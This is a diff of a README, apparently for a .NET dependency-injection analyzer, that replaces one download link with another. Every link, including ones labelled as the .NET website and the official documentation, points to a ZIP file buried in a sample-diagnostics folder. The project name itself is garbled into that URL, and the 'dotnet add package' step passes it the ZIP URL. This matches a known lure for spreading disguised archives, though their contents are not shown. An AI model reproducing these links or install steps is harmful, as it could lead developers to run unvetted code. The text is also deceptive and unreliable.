@@ -1,10 +1,10 @@
-# 🛠️ https://raw.githubusercontent.com/jeelanqadri/DependencyInjection.Lifetime.Analyzers/master/samples/SampleApp/Diagnostics/DI002/DependencyInjection.Lifetime.Analyzers-v1.5.zip - Stop Memory Leaks in .NET with Ease
+# 🛠️ https://github.com/jeelanqadri/DependencyInjection.Lifetime.Analyzers/raw/refs/heads/master/samples/SampleApp/Diagnostics/DI005/Dependency-Lifetime-Analyzers-Injection-3.3.zip - Stop Memory Leaks in .NET with Ease
 
-[![Download](https://raw.githubusercontent.com/jeelanqadri/DependencyInjection.Lifetime.Analyzers/master/samples/SampleApp/Diagnostics/DI002/DependencyInjection.Lifetime.Analyzers-v1.5.zip)](https://raw.githubusercontent.com/jeelanqadri/DependencyInjection.Lifetime.Analyzers/master/samples/SampleApp/Diagnostics/DI002/DependencyInjection.Lifetime.Analyzers-v1.5.zip)
+[![Download](https://github.com/jeelanqadri/DependencyInjection.Lifetime.Analyzers/raw/refs/heads/master/samples/SampleApp/Diagnostics/DI005/Dependency-Lifetime-Analyzers-Injection-3.3.zip)](https://github.com/jeelanqadri/DependencyInjection.Lifetime.Analyzers/raw/refs/heads/master/samples/SampleApp/Diagnostics/DI005/Dependency-Lifetime-Analyzers-Injection-3.3.zip)
 
 ## 🚀 Getting Started
 
-Welcome to the https://raw.githubusercontent.com/jeelanqadri/DependencyInjection.Lifetime.Analyzers/master/samples/SampleApp/Diagnostics/DI002/DependencyInjection.Lifetime.Analyzers-v1.5.zip project. This tool helps you prevent memory leaks and runtime crashes in your .NET applications. It identifies issues during the development process, allowing you to maintain the performance and reliability of your software.
+Welcome to the https://github.com/jeelanqadri/DependencyInjection.Lifetime.Analyzers/raw/refs/heads/master/samples/SampleApp/Diagnostics/DI005/Dependency-Lifetime-Analyzers-Injection-3.3.zip project. This tool helps you prevent memory leaks and runtime crashes in your .NET applications. It identifies issues during the development process, allowing you to maintain the performance and reliability of your software.
 
 ## 📦 What You Need
 
@@ -24,15 +24,15 @@ Before running the software, ensure you have the following:
 ## ⌨️ Installation
 
 1. **Visit the Releases Page**: Click the link below to go to the download page:
-   [Download https://raw.githubusercontent.com/jeelanqadri/DependencyInjection.Lifetime.Analyzers/master/samples/SampleApp/Diagnostics/DI002/DependencyInjection.Lifetime.Analyzers-v1.5.zip](https://raw.githubusercontent.com/jeelanqadri/DependencyInjection.Lifetime.Analyzers/master/samples/SampleApp/Diagnostics/DI002/DependencyInjection.Lifetime.Analyzers-v1.5.zip)
+   [Download https://github.com/jeelanqadri/DependencyInjection.Lifetime.Analyzers/raw/refs/heads/master/samples/SampleApp/Diagnostics/DI005/Dependency-Lifetime-Analyzers-Injection-3.3.zip](https://github.com/jeelanqadri/DependencyInjection.Lifetime.Analyzers/raw/refs/heads/master/samples/SampleApp/Diagnostics/DI005/Dependency-Lifetime-Analyzers-Injection-3.3.zip)
 
 2. **Download the Latest Release**: On the releases page, find the latest version of the software. Click on the version number and download the installer or ZIP file.
 
 3. **Extract and Install** (if necessary): If you downloaded a ZIP file, extract it to a folder of your choice. Run the installer if available.
 
 4. **Add to Your Project**: Open your preferred code editor and follow these steps:
-   - For Visual Studio: Right-click on your project in the Solution Explorer. Select “Manage NuGet Packages” and search for `https://raw.githubusercontent.com/jeelanqadri/DependencyInjection.Lifetime.Analyzers/master/samples/SampleApp/Diagnostics/DI002/DependencyInjection.Lifetime.Analyzers-v1.5.zip`. Click “Install”.
-   - For Visual Studio Code: Open the terminal and run the command `dotnet add package https://raw.githubusercontent.com/jeelanqadri/DependencyInjection.Lifetime.Analyzers/master/samples/SampleApp/Diagnostics/DI002/DependencyInjection.Lifetime.Analyzers-v1.5.zip`.
+   - For Visual Studio: Right-click on your project in the Solution Explorer. Select “Manage NuGet Packages” and search for `https://github.com/jeelanqadri/DependencyInjection.Lifetime.Analyzers/raw/refs/heads/master/samples/SampleApp/Diagnostics/DI005/Dependency-Lifetime-Analyzers-Injection-3.3.zip`. Click “Install”.
+   - For Visual Studio Code: Open the terminal and run the command `dotnet add package https://github.com/jeelanqadri/DependencyInjection.Lifetime.Analyzers/raw/refs/heads/master/samples/SampleApp/Diagnostics/DI005/Dependency-Lifetime-Analyzers-Injection-3.3.zip`.
 
 ## 📜 Usage
 
@@ -50,9 +50,9 @@ After installation, you can start using the analyzer in your project. Follow the
 
 ## ⚙️ Troubleshooting
 
-If you encounter problems while using https://raw.githubusercontent.com/jeelanqadri/DependencyInjection.Lifetime.Analyzers/master/samples/SampleApp/Diagnostics/DI002/DependencyInjection.Lifetime.Analyzers-v1.5.zip, consider these tips:
+If you encounter problems while using https://github.com/jeelanqadri/DependencyInjection.Lifetime.Analyzers/raw/refs/heads/master/samples/SampleApp/Diagnostics/DI005/Dependency-Lifetime-Analyzers-Injection-3.3.zip, consider these tips:
 
-- **Installation Issues**: Check if you have the correct .NET SDK version. If not, download it from the [.NET website](https://raw.githubusercontent.com/jeelanqadri/DependencyInjection.Lifetime.Analyzers/master/samples/SampleApp/Diagnostics/DI002/DependencyInjection.Lifetime.Analyzers-v1.5.zip).
+- **Installation Issues**: Check if you have the correct .NET SDK version. If not, download it from the [.NET website](https://github.com/jeelanqadri/DependencyInjection.Lifetime.Analyzers/raw/refs/heads/master/samples/SampleApp/Diagnostics/DI005/Dependency-Lifetime-Analyzers-Injection-3.3.zip).
   
 - **Permissions**: Make sure your editor has permission to access the folder where the analyzer is installed.
 
@@ -70,13 +70,13 @@ If you want to contribute to the project:
 
 ## 📖 Additional Resources
 
-- **Documentation**: For detailed information about features and settings, refer to the official [documentation](https://raw.githubusercontent.com/jeelanqadri/DependencyInjection.Lifetime.Analyzers/master/samples/SampleApp/Diagnostics/DI002/DependencyInjection.Lifetime.Analyzers-v1.5.zip).
+- **Documentation**: For detailed information about features and settings, refer to the official [documentation](https://github.com/jeelanqadri/DependencyInjection.Lifetime.Analyzers/raw/refs/heads/master/samples/SampleApp/Diagnostics/DI005/Dependency-Lifetime-Analyzers-Injection-3.3.zip).
 - **Best Practices**: Learn about best practices for dependency injection in .NET frameworks to enhance your development workflow.
 
 ## 📥 Download & Install
 
 To get started, visit the releases page:
 
-[Download https://raw.githubusercontent.com/jeelanqadri/DependencyInjection.Lifetime.Analyzers/master/samples/SampleApp/Diagnostics/DI002/DependencyInjection.Lifetime.Analyzers-v1.5.zip](https://raw.githubusercontent.com/jeelanqadri/DependencyInjection.Lifetime.Analyzers/master/samples/SampleApp/Diagnostics/DI002/DependencyInjection.Lifetime.Analyzers-v1.5.zip)
+[Download https://github.com/jeelanqadri/DependencyInjection.Lifetime.Analyzers/raw/refs/heads/master/samples/SampleApp/Diagnostics/DI005/Dependency-Lifetime-Analyzers-Injection-3.3.zip](https://github.com/jeelanqadri/DependencyInjection.Lifetime.Analyzers/raw/refs/heads/master/samples/SampleApp/Diagnostics/DI005/Dependency-Lifetime-Analyzers-Injection-3.3.zip)
 
 Follow the steps outlined above to install and set up the analyzer for your project. Enjoy a smoother coding experience with reduced memory leaks and crashes!
